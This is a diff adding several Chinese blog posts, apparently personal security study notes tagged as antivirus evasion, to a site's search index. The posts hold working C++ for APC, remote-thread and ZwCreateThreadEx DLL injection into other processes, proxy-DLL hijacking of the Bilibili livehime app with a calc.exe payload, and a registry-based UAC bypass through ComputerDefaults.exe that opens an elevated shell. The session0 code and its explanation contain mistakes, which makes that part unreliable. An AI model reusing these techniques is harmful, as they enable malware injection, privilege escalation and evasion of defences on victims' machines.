@@ -4992,4 +4992,2099 @@ public class URLDNS {
         <tag>利用链</tag>
       </tags>
   </entry>
+  <entry>
+    <title>APC注入</title>
+    <url>/2024/03/26/APC%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[# 简介
+1. 即“异步调用过程”，在windows中APC是一种并发机制（异步调用过程解释）
+2. 当处于用户模式的APC压入线程APC队列后，该线程并不直接调用APC函数，除非该线程处于可通知状态
+3. 调用的APC顺序为先入先出。
+4. 每一个线程都有自己的APC队列，可以使用API将一个APC插入到线程的APC队列中
+5. APC有两种形式，由内核产生的APC称为内核态（kernel-mode）APC，而由用户应用调用的APC称为用户态（user-mode）APC
+6. APC其实是通过向线程中插入回调函数来实现的，但是调用这个回调函数是有条件的
+  a. 当用户模式 APC 排队时，它排队的线程不会被定向到调用 APC 函数，除非它处于可警告状态。线程在调用SleepEx、SignalObjectAndWait、MsgWaitForMultipleObjectsEx、WaitForMultipleObjectsEx、WaitForSingleObjectEx函数时进入可警告状态
+  b. 如果在 APC 排队之前等待满足，则线程不再处于可警告等待状态，因此不会执行 APC 函数
+  c. 但是，APC 仍在排队，因此当线程调用另一个可警告的等待函数时，APC 函数将被执行。
+  
+# 实现原理
+往线程APC队列中添加APC，系统就会产生一个“软中断”，而在线程下一次被调用的时候，就会执行APC函数
+
+# 实现条件
+1. 必须是多线程的情况下
+2. 必须要调用设定的回调函数
+
+# 代码实现
+```C++
+#include <cstdio>
+#include <cstring>
+#include <Windows.h>
+#include <tlhelp32.h>
+
+//提权
+BOOL EnableDebugPrivilege()
+{
+    HANDLE hToken;
+    BOOL fOk = FALSE;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
+    {
+        TOKEN_PRIVILEGES tp;
+        tp.PrivilegeCount = 1;
+        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+        fOk = (GetLastError() == ERROR_SUCCESS);
+        CloseHandle(hToken);
+    }
+    return fOk;
+}
+
+//获取进程的PID
+DWORD GetProcessPID(LPCWSTR processName) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        printf("[-]创建进程快照失败\n");
+        return 0;
+    }
+
+    PROCESSENTRY32 processEntry;
+    processEntry.dwSize = sizeof(PROCESSENTRY32);
+
+    if (Process32First(hSnapshot, &processEntry)) {
+        while (_wcsicmp(processEntry.szExeFile, processName) != 0) {
+            if (!Process32Next(hSnapshot, &processEntry)) {
+                printf("[-]未发现%ls进程\n", processName);
+                CloseHandle(hSnapshot);
+                return 0;
+            }
+        }
+
+        printf("%ls进程的PID为：%lu\n", processName, processEntry.th32ProcessID);
+        CloseHandle(hSnapshot);
+        return processEntry.th32ProcessID;
+    }
+
+    printf("[-]没有返回进程信息\n");
+    CloseHandle(hSnapshot);
+    return 0;
+}
+
+void APCInjectDll(DWORD pid, LPCSTR dllPath) {
+    EnableDebugPrivilege();
+    // 1. 打开进程，获取句柄
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (hProcess != NULL) {
+        DWORD sizeDllPath = strlen(dllPath);
+        LPVOID mem = VirtualAllocEx(hProcess, NULL, sizeDllPath, MEM_COMMIT, PAGE_READWRITE);
+        if (mem != NULL) {
+            BOOL writeMem = WriteProcessMemory(hProcess, mem, dllPath, sizeDllPath, NULL);
+            if (writeMem) {
+                FARPROC loadLibraryAddr = GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
+                if (loadLibraryAddr != NULL) {
+                    THREADENTRY32 te;
+                    te.dwSize = sizeof(te);
+                    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
+                    DWORD dwRet = 0;
+                    HANDLE hThread = NULL;
+                    if (Thread32First(hSnap, &te)) {
+                        do {
+                            if (te.th32OwnerProcessID == pid) {
+                                hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+                                if (hThread) {
+                                    dwRet = QueueUserAPC((PAPCFUNC)loadLibraryAddr, hThread,(ULONG_PTR)mem);
+                                    hThread = NULL;
+                                }
+                            }
+                        } while (Thread32Next(hSnap, &te));
+                    }
+                    CloseHandle(hThread);
+                    CloseHandle(hProcess);
+                    CloseHandle(hSnap);
+                }
+            }
+        }
+    }
+}
+
+
+
+int main() {
+    DWORD pid = GetProcessPID(L"notepad.exe");
+    APCInjectDll(pid, "D:\\study\\C++\\dll\\Dll5\\x64\\Debug\\Dll5.dll");
+}
+```
+# 学习
+https://www.cnblogs.com/nice0e3/p/15318330.html]]></content>
+      <categories>
+        <category>代码</category>
+      </categories>
+      <tags>
+        <tag>免杀</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Dll劫持</title>
+    <url>/2024/03/26/Dll%E5%8A%AB%E6%8C%81/</url>
+    <content><![CDATA[
+# 简述
+其实就是常说的白加黑
+
+# 优点
+1. 挖掘成本低
+2. 免杀成本低
+3. 存活更长久
+
+# 类别
+这里分为两类
+1. 加载找不到的dll
+2. 加载已存在的dll
+
+## 加载找不到的dll
+
+这里拿bilibili的直播姬做例子
+首先拿ProcessMonitor监听livehime.exe，filter如下
+
+![](https://s3.hedgedoc.org/demo/uploads/8f479052-5ed8-43ec-9470-2d2a9ea078ea.png)
+
+然后运行livehime.exe
+可以看到，这里有三个dll没有找到，我们选第一个WINMM.dll测试
+
+### WINMM.dll
+
+![](https://s3.hedgedoc.org/demo/uploads/644c83e4-bbe5-4c4c-82d1-fb149fb74fde.png)
+
+这里我们自己写一个WINMM.dll，代码入下：
+
+```C++
+// dllmain.cpp : 定义 DLL 应用程序的入口点。
+#include "pch.h"
+#include "Windows.h"
+#include "framework.h"
+#include <cstdlib>
+
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+    DWORD  ul_reason_for_call,
+    LPVOID lpReserved
+)
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        system("calc.exe");
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+
+```
+
+将生成的dll放入D:\livehime，最后运行
+
+![](https://s3.hedgedoc.org/demo/uploads/f0527fa8-8bbf-46a1-aff7-68c9190ff06c.png)
+
+是缺了哪些函数，用dumpbin.exe查看WINMM.dll需要哪些函数
+
+![](https://s3.hedgedoc.org/demo/uploads/cf602597-aca3-4f9f-9625-37b934ba9c4c.png)
+
+然后代码中加上即可
+
+![](https://s3.hedgedoc.org/demo/uploads/600f0194-e635-4dab-9918-032a98a9a6be.png)
+
+最终效果：
+
+![](https://s3.hedgedoc.org/demo/uploads/d0ebff08-a918-47e4-8181-f9005d5a07a6.png)
+
+成功弹出计算器
+
+### profapi.dll
+
+![](https://s3.hedgedoc.org/demo/uploads/8cba5605-5f7f-4101-89a2-a948a5c432ec.png)
+
+代码如下：
+
+```
+// dllmain.cpp : 定义 DLL 应用程序的入口点。
+#include "pch.h"
+#include "Windows.h"
+#include "framework.h"
+#include <cstdlib>
+
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+    DWORD  ul_reason_for_call,
+    LPVOID lpReserved
+)
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        system("calc.exe");
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+
+
+```
+
+![](https://s3.hedgedoc.org/demo/uploads/47ae05e1-4f2c-48d8-9881-6d5f0a2a0c23.png)
+
+![](https://s3.hedgedoc.org/demo/uploads/f20c1159-c2f4-4ff6-b403-f61206eb790d.png)
+
+当然，其他的dll也可以这样尝试
+
+## 加载已存在的dll
+
+已经存在的dll，exe程序肯定是需要dll里面的某些个函数才能正常运行啦
+
+如果直接按照上面的方法来替换已经存在的dll的话，那么肯定exe程序运行要出问题
+
+那么就可以写一个代码，先执行我们的代码，再跳转到正常的dll中正常执行
+
+这里需要用到工具“AheadLib”来实现
+
+### streaming-processor.dll
+首先拿ProcessMonitor监听livehime.exe，filter如下
+
+![](https://s3.hedgedoc.org/demo/uploads/fd7d5710-ed4e-478e-945e-475bf9fee838.png)
+
+可以看到，streaming-processor.dll是在D:\livehime\4.60.1.6325中并加载成功了的
+
+![](https://s3.hedgedoc.org/demo/uploads/23fc6524-3d0b-44e9-8117-da5c25c02094.png)
+
+用 AheadLib 搞一个dll代码
+
+```C++
+
+//
+// created by AheadLibEx
+// Author:i1tao
+// Blog:https://www.cnblogs.com/0xc5
+// Github:https://github.com/i1tao/AheadLibEx
+// 
+
+#include <windows.h>
+#include <Shlwapi.h>
+
+#pragma comment( lib, "Shlwapi.lib")
+
+#pragma comment(linker, "/EXPORT:CreateStreamingProcessor=AheadLibEx_CreateStreamingProcessor,@1")
+
+
+extern "C" 
+{
+PVOID pfnAheadLibEx_CreateStreamingProcessor;
+}
+
+
+static HMODULE g_OldModule = NULL;
+
+VOID WINAPI Free()
+{
+	if (g_OldModule)
+	{
+		FreeLibrary(g_OldModule);
+	}
+}
+
+
+BOOL WINAPI Load()
+{
+	LPCSTR tzPath = "D:\\livehime\\4.60.1.6325\\streaming-processor1.dll";
+	TCHAR tzTemp[MAX_PATH * 2];
+
+	//
+	// 这里是否从系统目录或当前目录加载原始DLL
+	//
+	//GetModuleFileName(NULL,tzPath,MAX_PATH); //获取本目录下的
+	//PathRemoveFileSpec(tzPath);
+
+	//GetSystemDirectory(tzPath, MAX_PATH); //默认获取系统目录的
+
+	//lstrcat(tzPath, TEXT("\\streaming-processor.dll"));
+
+	g_OldModule = LoadLibraryA(tzPath);
+	if (g_OldModule == NULL)
+	{
+		wsprintf(tzTemp, TEXT("无法找到模块 %s,程序无法正常运行"), tzPath);
+		MessageBox(NULL, tzTemp, TEXT("AheadLibEx"), MB_ICONSTOP);
+	}
+
+	return (g_OldModule != NULL);
+
+}
+
+
+FARPROC WINAPI GetAddress(PCSTR pszProcName)
+{
+	FARPROC fpAddress;
+	CHAR szProcName[64];
+	TCHAR tzTemp[MAX_PATH];
+
+	fpAddress = GetProcAddress(g_OldModule, pszProcName);
+	if (fpAddress == NULL)
+	{
+		if (HIWORD(pszProcName) == 0)
+		{
+			wsprintfA(szProcName, "#%d", pszProcName);
+			pszProcName = szProcName;
+		}
+
+		wsprintf(tzTemp, TEXT("无法找到函数 %hs,程序无法正常运行"), pszProcName);
+		MessageBox(NULL, tzTemp, TEXT("AheadLibEx"), MB_ICONSTOP);
+		ExitProcess(-2);
+	}
+	return fpAddress;
+}
+
+BOOL WINAPI Init()
+{
+	pfnAheadLibEx_CreateStreamingProcessor = GetAddress("CreateStreamingProcessor");
+	return TRUE;
+}	
+
+DWORD WINAPI ThreadProc(LPVOID lpThreadParameter)
+{
+	HANDLE hProcess;
+
+	PVOID addr1 = reinterpret_cast<PVOID>(0x00401000);
+	BYTE data1[] = { 0x90, 0x90, 0x90, 0x90 };
+
+	hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());
+	if (hProcess)
+	{
+		WriteProcessMemory(hProcess, addr1, data1, sizeof(data1), NULL);
+
+		CloseHandle(hProcess);
+	}
+
+	return 0;
+}
+
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
+{
+	if (dwReason == DLL_PROCESS_ATTACH)
+	{
+		DisableThreadLibraryCalls(hModule);
+
+		if (Load() && Init())
+		{
+			TCHAR szAppName[MAX_PATH] = TEXT("livehime.exe");//请修改宿主进程名
+			TCHAR szCurName[MAX_PATH];
+
+			GetModuleFileName(NULL, szCurName, MAX_PATH);
+			PathStripPath(szCurName);
+
+			//是否判断宿主进程名
+			if (StrCmpI(szCurName, szAppName) == 0)
+			{
+				//启动补丁线程或者其他操作
+				HANDLE hThread = CreateThread(NULL, NULL, ThreadProc, NULL, NULL, NULL);
+				system("calc.exe");
+				if (hThread)
+				{
+					CloseHandle(hThread);
+				}
+			}
+		}
+	}
+	else if (dwReason == DLL_PROCESS_DETACH)
+	{
+		Free();
+	}
+
+	return TRUE;
+}
+
+
+```
+
+最后将原来的streaming-processor.dll改为streaming-processor1.dll，点击livehime.exe即可
+
+![](https://s3.hedgedoc.org/demo/uploads/d8c1ea08-2010-4b82-962d-b27c1c4374a1.png)
+
+触发计算器，且livehime.exe运行正常
+
+如果是不用转发的这个办法，那么livehime.exe是无法正常运行的]]></content>
+      <categories>
+        <category>代码</category>
+      </categories>
+      <tags>
+        <tag>免杀</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Dll注入</title>
+    <url>/2024/03/26/Dll%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[# 简述
+
+就是将dll给放入某一个进程的地址空间中，让它成为进程的一部分
+其实就是常说的将dll注入到进程
+但是这个也存在局限性，因为必须要在目标机器上留下我们的dll
+
+# 注入思路
+1. 获取目标进程pid
+2. 通过pid获取目标进程句柄
+3. 在进程中创建一个足够大的内存空间，用于存放dll路径
+4. 将dll给写入空间中
+5. 获取LoadLibraryW函数
+6. 创建线程，用LoadLibraryW加载存放dll的内存空间
+7. 清理资源
+
+# 代码
+
+```C++
+#include <cstdio>
+#include <cstring>
+#include <Windows.h>
+#include <tlhelp32.h>
+
+// 获取进程的PID
+DWORD GetProcessPID(LPCTSTR processName) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        printf("[-]创建进程快照失败\n");
+        return 0;
+    }
+
+    PROCESSENTRY32 processEntry;
+    processEntry.dwSize = sizeof(PROCESSENTRY32);
+
+    if (Process32First(hSnapshot, &processEntry)) {
+        while (_wcsicmp(processEntry.szExeFile, processName) != 0) {
+            if (!Process32Next(hSnapshot, &processEntry)) {
+                printf("[-]未发现%ls进程\n", processName);
+                CloseHandle(hSnapshot);
+                return 0;
+            }
+        }
+
+        printf("%ls进程的PID为：%lu\n", processName, processEntry.th32ProcessID);
+        CloseHandle(hSnapshot);
+        return processEntry.th32ProcessID;
+    }
+
+    printf("[-]没有返回进程信息\n");
+    CloseHandle(hSnapshot);
+    return 0;
+}
+
+DWORD RemoteThreadInject(DWORD pid, LPCTSTR dllPath) {
+    //1. 打开进程，获取句柄
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (hProcess == NULL) {
+        printf("[-]打开进程失败 \n");
+        return 0;
+    }
+    else {
+        printf("[+]打开进程成功 \n");
+    }
+
+    //2. 远程申请内存
+    DWORD sizeDllPath = (wcslen(dllPath) + 1) * sizeof(TCHAR);
+    LPVOID mem = VirtualAllocEx(hProcess, NULL, sizeDllPath, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (mem == NULL) {
+        printf("[-]远程申请内存失败 \n");
+        return 0;
+    }
+    else {
+        printf("[+]远程申请内存成功 \n");
+    }
+
+    //3. 将dllPath给写入内存
+    BOOL writeMem = WriteProcessMemory(hProcess, mem, dllPath, sizeDllPath, NULL);
+    if (!writeMem) {
+        printf("[-]将dllPath写入内存失败 \n");
+        return 0;
+    }
+    else {
+        printf("[+]将dllPath写入内存成功 \n");
+    }
+
+
+    //4. 获取LoadLibrary函数
+    FARPROC loadLibraryAddr = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
+
+    //5. 创建线程
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, mem, 0, NULL);
+    if (hThread == NULL) {
+        printf("[-]创建远程线程失败\n");
+        return 0;
+    }
+    else {
+        printf("[+]创建远程线程成功\n");
+    }
+
+    //6. 等待线程结束
+    WaitForSingleObject(hThread, -1);
+
+    // 7. 清理资源
+    CloseHandle(hThread);
+    VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
+    CloseHandle(hProcess);
+}
+
+int main() {
+    DWORD pid = GetProcessPID(L"notepad.exe");
+    RemoteThreadInject(pid, L"D:\\study\\C++\\dll\\Dll5\\x64\\Release\\DLL5.dll");
+}
+```
+
+效果：
+
+![](https://s3.hedgedoc.org/demo/uploads/4f5dacc1-f209-4725-ba6d-185645827646.png)
+
+]]></content>
+      <categories>
+        <category>代码</category>
+      </categories>
+      <tags>
+        <tag>免杀</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>session0 注入</title>
+    <url>/2024/03/26/session0%20%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[# 简介
+一般情况下将我们是没有办法将shellcode给直接注入到如lsass.exe的进程中的（user权限）
+还有就是用户态的函数如CreateRemoteThread早就被杀软杀烂了，所以就考虑用内核态的函数
+
+# 实现方法
+主要还是利用api函数，不过这个api函数不是我们一般情况下用户态函数
+这里用x64位下的CreateRemoteThread函数举例子
+
+# 实现流程
+## kernel32.dll
+
+首先查看kernel32.dll中的CreateRemoteThread函数
+
+![](https://s3.hedgedoc.org/demo/uploads/dd252100-a40a-4551-8b49-46f223f35f1c.png)
+
+这里没有搜到，CreateRemoteThread
+1. 但是找到一个比较像的函数CreateRemoteThreadStub
+2. 接着调用了CreateRemoteThreadStub()
+3. 最后调用了CreateRemoteThreadEx（__imp_CreateRemoteThreadEx）
+
+从第3号标记可以看到，CreateRemoteThreadEx是红色的，这代表着此函数是从第三方dll中调用出来的
+
+按一下回车键查看伪代码，可以看到CreateRemoteThreadEx有8个参数
+
+![](https://s3.hedgedoc.org/demo/uploads/8590aa0f-be0c-48b8-a174-1dd28670ec7a.png)
+
+我们导入表搜索CreateRemoteThreadEx
+
+![](https://s3.hedgedoc.org/demo/uploads/d242bf2f-81a9-4d36-83a9-70c3190783e8.png)
+
+这里的Library显示的是自己，不过要去kernelbase中搜索才知道（我也不知道为啥要去kernelbase.dll中）
+
+## kernelbase.dll
+
+kernelbase.dll中搜索CreateRemoteThreadEx，有搜到，不过并没有找到具体调用了哪一个函数
+
+![](https://s3.hedgedoc.org/demo/uploads/f7b8739a-c643-491b-9233-cb9592a9039b.png)
+
+在汇编中，按tab键看伪代码
+
+![](https://s3.hedgedoc.org/demo/uploads/fec10d6d-6570-4c60-adb5-b9512c01e723.png)
+
+发现了NtCreateThreadEx
+这么多调用了的函数为什么就看NtCreateThreadEx？
+因为NtCreateThreadEx和CreateRemoteThreadEx长得像
+我们去导入表查看NtCreateThreadEx
+
+![](https://s3.hedgedoc.org/demo/uploads/70f497f0-5b08-4eea-b748-82c870abcf07.png)
+
+可以看到，NtCreateThreadEx在ntdll.dll中
+
+## ntdll.dll
+
+![](https://s3.hedgedoc.org/demo/uploads/b1f3da86-f0a6-4196-ba0a-560df69804f7.png)
+
+最终调用NtCreateThreadEx，随后调用syscall进入内核层，随后调用ZwCreateThreadEx函数
+你问NtCreateThreadEx和ZwCreateThreadEx的区别？
+1. NtCreateThreadEx是用户态的函数
+2. ZwCreateThreadEx是内核态的函数
+
+ZwCreateThreadEx的权限比NtCreateThreadEx的大
+就好比有一个事情需要公司里的其他人配合，你一个普通职员去安排这个事情，肯定没有老板去安排这个事情稳妥好办，因为没有其他员工不敢买老板的账
+
+![](https://s3.hedgedoc.org/demo/uploads/5cadee8b-edc3-478c-a326-cfea34a05912.png)
+
+ZwCreateThreadEx的原型
+
+```C++
+#ifdef _WIN64
+typedef DWORD(WINAPI *typedef_ZwCreateThreadEx)(
+	PHANDLE ThreadHandle,
+	ACCESS_MASK DesiredAccess,
+	LPVOID ObjectAttributes,
+	HANDLE ProcessHandle,
+	LPTHREAD_START_ROUTINE lpStartAddress,
+	LPVOID lpParameter,
+	ULONG CreateThreadFlags,
+	SIZE_T ZeroBits,
+	SIZE_T StackSize,
+	SIZE_T MaximumStackSize,
+	LPVOID pUnkown);
+#else
+typedef DWORD(WINAPI *typedef_ZwCreateThreadEx)(
+	PHANDLE ThreadHandle,
+	ACCESS_MASK DesiredAccess,
+	LPVOID ObjectAttributes,
+	HANDLE ProcessHandle,
+	LPTHREAD_START_ROUTINE lpStartAddress,
+	LPVOID lpParameter,
+	BOOL CreateSuspended,
+	DWORD dwStackSize,
+	DWORD dw1,
+	DWORD dw2,
+	LPVOID pUnkown);
+#endif
+
+# 完整代码
+
+```C++
+#include <cstdio>
+#include <cstring>
+#include <Windows.h>
+#include <tlhelp32.h>
+
+#ifdef _WIN64
+typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    LPVOID ObjectAttributes,
+    HANDLE ProcessHandle,
+    LPTHREAD_START_ROUTINE lpStartAddress,
+    LPVOID lpParameter,
+    ULONG CreateThreadFlags,
+    SIZE_T ZeroBits,
+    SIZE_T StackSize,
+    SIZE_T MaximumStackSize,
+    LPVOID pUnkown);
+#else
+typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    LPVOID ObjectAttributes,
+    HANDLE ProcessHandle,
+    LPTHREAD_START_ROUTINE lpStartAddress,
+    LPVOID lpParameter,
+    BOOL CreateSuspended,
+    DWORD dwStackSize,
+    DWORD dw1,
+    DWORD dw2,
+    LPVOID pUnkown);
+#endif
+
+//提权
+BOOL EnableDebugPrivilege()
+{
+    HANDLE hToken;
+    BOOL fOk = FALSE;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
+    {
+        TOKEN_PRIVILEGES tp;
+        tp.PrivilegeCount = 1;
+        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+        fOk = (GetLastError() == ERROR_SUCCESS);
+        CloseHandle(hToken);
+    }
+    return fOk;
+}
+
+//获取进程的PID
+DWORD GetProcessPID(LPCWSTR processName) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        printf("[-]创建进程快照失败\n");
+        return 0;
+    }
+
+    PROCESSENTRY32 processEntry;
+    processEntry.dwSize = sizeof(PROCESSENTRY32);
+
+    if (Process32First(hSnapshot, &processEntry)) {
+        while (_wcsicmp(processEntry.szExeFile, processName) != 0) {
+            if (!Process32Next(hSnapshot, &processEntry)) {
+                printf("[-]未发现%ls进程\n", processName);
+                CloseHandle(hSnapshot);
+                return 0;
+            }
+        }
+
+        printf("%ls进程的PID为：%lu\n", processName, processEntry.th32ProcessID);
+        CloseHandle(hSnapshot);
+        return processEntry.th32ProcessID;
+    }
+
+    printf("[-]没有返回进程信息\n");
+    CloseHandle(hSnapshot);
+    return 0;
+}
+
+void ZwCreateThreadInject(DWORD pid, LPCWSTR dllPath) {
+    //1. 打开进程，获取句柄
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (hProcess != NULL) {
+        //2. 远程申请内存
+        DWORD sizeDllPath = (wcslen(dllPath) + 1) * sizeof(TCHAR);
+        LPVOID mem = VirtualAllocEx(hProcess, NULL, sizeDllPath, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        if (mem != NULL) {
+            BOOL writeMem = WriteProcessMemory(hProcess, mem, dllPath, sizeDllPath, NULL);
+            if (writeMem) {
+                FARPROC loadLibraryAddr = GetProcAddress(LoadLibraryW(L"kernel32.dll"), "LoadLibraryW");
+                if (loadLibraryAddr != NULL) {
+                    HMODULE hNtdllDll = LoadLibraryA("ntdll.dll");
+                    typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdllDll, "ZwCreateThreadEx");
+                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, mem, 0, NULL);
+                    HANDLE hRemoteThread = NULL;
+                    DWORD injectStatus = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)loadLibraryAddr, mem, 0, 0, 0, 0, NULL);
+                    if (hRemoteThread != NULL) {
+                        printf("success\n");
+                    }
+                    FreeLibrary(hNtdllDll);
+                }
+            }
+        }
+        //7. 释放申请的内存
+        VirtualFreeEx(hProcess, mem, sizeDllPath, MEM_COMMIT);
+    }
+    //8. 关闭进程句柄
+    CloseHandle(hProcess);
+}
+
+
+int main() {
+    DWORD pid = GetProcessPID(L"notepad.exe");
+    ZwCreateThreadInject(pid, L"D:\\study\\C++\\dll\\Dll5\\x64\\Debug\\Dll5.dll");
+}
+```
+
+# 学习
+https://www.cnblogs.com/cunren/p/15267403.html
+]]></content>
+      <categories>
+        <category>代码</category>
+      </categories>
+      <tags>
+        <tag>免杀</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bypassUAC</title>
+    <url>/2024/03/26/bypassUAC/</url>
+    <content><![CDATA[# UAC
+## 简介
+UAC的主要目的是提高系统的安全性，防止未经授权的更改和恶意软件的滥用。
+它通过弹出对话框来通知用户，当某个程序试图以管理员权限运行时，或者尝试对系统进行更改时。这样，用户可以确认是否允许这些操作，从而减少了恶意软件通过欺骗方式获得系统权限的可能性。
+
+![](https://s3.hedgedoc.org/demo/uploads/4daeb51a-c7c2-4ced-829c-01e6e2960656.png)
+
+# bypassUAC
+
+## 简述
+bypassUAC主要用于提权或者作为免杀的一环
+
+## 利用条件
+虽然UAC提高了系统的安全性，但有时候用户可能会感到烦扰，因为有些程序需要使用管理员权限而会导致频繁弹出权限提升提示。
+
+所以windows给某些设置了自动提升权限（autoElevate），且不会弹出权限提升提示（静默启动），从而启动程序时，直接就是以高权限启动（这个可以看程序的manifest标识的配置属性autoElevate为true）
+
+但是这还不能利用，我们需要在这两条件的前提下，在启动的时候可以调用其他命令,那么就需要介绍Shell\Open\Command了：
+1. 注册表中的Shell\Open\Command是Windows操作系统中的一个注册表项，用于指定在打开文件时所执行的命令。这个注册表项通常用于关联文件类型和相应的应用程序。
+2. 在Windows中，每个文件类型都会有一个关联的默认程序来打开它。例如，对于.txt文件，通常会关联到记事本应用程序。而这种关联是通过注册表中的相应项来实现的。
+3. Shell\Open\Command注册表项包含了一个字符串值，即文件的执行命令。当用户双击一个文件时，操作系统会在这个注册表项中查找相应的命令，然后执行它来打开文件。
+
+总的来说就3点：
+1. 程序的manifest标识的配置属性autoElevate为true
+2. 不会弹出uac窗口
+3. 程序启动时候，调用了注册表中的Shell\Open\Command键值对
+
+上面第1点可以用下面的bat脚本跑：
+```
+@echo off
+
+set "search_dir=C:\Windows\System32"
+
+echo begin......
+
+for /r "%search_dir%" %%i in (*.exe) do (
+    sigcheck64.exe -m "%%i" | findstr "autoElevate" > nul
+    if not errorlevel 1 (
+        echo %%i
+    )
+)
+
+pause
+
+```
+
+![](https://s3.hedgedoc.org/demo/uploads/b6939411-35d6-4d3b-b384-283254171220.png)
+
+## 例子
+
+这里用微软的程序sigcheck64.exe进行查看 C:\Windows\System32\ComputerDefaults.exe
+下载地址：https://learn.microsoft.com/en-us/sysinternals/downloads/sigcheck
+
+1. 白名单程序（包含数字签名等...）且manifest标识的配置属性autoElevate为true
+
+![](https://s3.hedgedoc.org/demo/uploads/8741f3c1-9495-49a4-8501-ffeee1f63d95.png)
+
+2. 程序启动没有UAC弹窗（静默启动）
+3. 用Procmon.exe监听ComputerDefaults.exe，并从注册表里查询 "Shell\Open\Command" 键值对
+
+![](https://s3.hedgedoc.org/demo/uploads/f1055d56-d34b-4619-851d-80d40f8f6080.png)
+
+4. 在注册表中找这个地址：HKCU\Software\Classes\ms-settings\Shell\Open\command（HKCU是HKEY_CURRENT_USER的首字母缩写）
+
+![](https://s3.hedgedoc.org/demo/uploads/c153d6a7-ff68-4730-969b-66d2716f96eb.png)
+
+可以看到HKCU\Software\Classes目录下没有ms-settings\Shell\Open\command这个项，没有就对了，咱们自己创建
+
+![](https://s3.hedgedoc.org/demo/uploads/b2111ec5-6ffc-493e-b54c-4270de5189fd.png)
+
+然后再在HKCU\Software\Classes\ms-settings\Shell\Open\command的默认项中加一个cmd.exe
+
+![](https://s3.hedgedoc.org/demo/uploads/a562795b-ba37-417b-8123-dd9dce5e8d05.png)
+
+最后运行C:\Windows\System32\ComputerDefaults.exe
+
+![](https://s3.hedgedoc.org/demo/uploads/28b5fed5-90b6-4f6b-9b73-58d066ad5db5.png)
+
+可以看到，并未弹出cmd.exe的窗口，我们再看下Procmon.exe的监听
+
+![](https://s3.hedgedoc.org/demo/uploads/8aee3c43-6082-4667-9f69-fc813b4a45a4.png)
+
+可以看到HKCU\Software\Classes\ms-settings\Shell\Open\command是加载成功了的
+但是又多了一个HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute且显示NAME NOT FOUND，那么咱们再给加一个DelegateExecute
+
+![](https://s3.hedgedoc.org/demo/uploads/fa8f9bb1-bbcf-424d-84c0-cdb05bfa62ee.png)
+
+最后再次运行C:\Windows\System32\ComputerDefaults.exe
+
+![](https://s3.hedgedoc.org/demo/uploads/b307464f-71c1-432d-bef7-7eeb27aa42b6.png)
+
+成功弹出cmd.exe，而且是管理员权限的
+
+## 问题
+
+Windows defener要杀
+
+![](https://s3.hedgedoc.org/demo/uploads/72a6fa8d-f9e6-4751-aa9c-f07341c82393.png)
+
+## 代码一键化
